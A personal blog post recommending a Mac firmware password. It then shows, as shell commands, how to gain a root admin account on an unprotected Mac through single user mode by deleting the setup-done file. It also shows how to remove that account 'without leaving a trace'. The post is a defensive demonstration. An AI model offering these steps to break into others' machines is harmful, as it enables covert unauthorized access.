---
layout: post
title: How to hack a Mac
---

<div class="message">
  tl;dr The most important thing to set on any mac.
</div>

Do you use a mac? Do you have an open firmware password set? If not, reboot your machine, and hold down command-R to enter recovery mode. From there, select Utilities from the menubar, then click Firmware Password to set a password. Make sure you remember this. If you ever forget it, you can take your machine to an apple store where they will do some funky process and call the mothership, then reset your password. There use to be an exploit where you could reboot without one of the ram sticks and it would reset the password, but that was patched a few years ago. Besides, most machines come with RAM soldered to the motherboard these days, so it is kind of a moot point. 

The open firmware password is at the hardware level, and will require the user to enter a password in order to boot any other operating system (or mode). On my mac, I have this, so if my machine were to ever be stolen, it would effectively be a brick. Since the SSD is technically removable (although non-standard) in my 15 retina MBP, a thief could theoretically remove the SSD and replace it with a blank one from other world computing, but unfortunately for them, it would be impossible to install a new OS on that drive without my firmware password, which would be very difficult to crack considering you cannot simply get a hash can run john the ripper.

Just for fun, I decided to see just how easy it would be to break into my own machine if I forgot the password. If you want to just reset the password, you can open a terminal in recovery mode, and type resetpassword to reset it. But I was more interested in how to break in without the owner knowing. If you changed the password, then it would be pretty obvious what you did. Here is what I did:

First, I rebooted into single user mode by restarting the machine and holding down command-s.

Once booted, mount the filesystem:
{% highlight bash %}
$ mount -uw /
{% endhighlight %}

Simply delete the applesetupdone file, and the next time the machine boots it will prompt you to create a new Administrator account, which convienently will have root privileges.
{% highlight bash %}
$ rm /var/db/.AppleSetupDone
{% endhighlight %}

Finally, reboot the machine.
{% highlight bash %}
$ reboot
{% endhighlight %}

At this point, you can go ahead and create a new user account which will have full root access. If you want to delete it without leaving a trace, reboot back into single user mode, then

Mount the filesystem:
{% highlight bash %}
$ mount -uw /
{% endhighlight %}

Then delete the user folder and a few other files:
{% highlight bash %}
$ rm /var/db/dslocal/nodes/Default/users/{username}.plist
$ rm -rf /Users/{username}
{% endhighlight %}

Finally, reboot the machine.
{% highlight bash %}
$ reboot
{% endhighlight %}

Please only do this on machines that you own, and make sure to set an open firmware password. Also, you could use FireVault instead of / in addition to this method, but it will not prevent you from removing the SSD and installing another os.

-----

Want to see something else added? <a href="https://github.com/dwj300/dwj300.github.io/issues/new">Open an issue.</a>
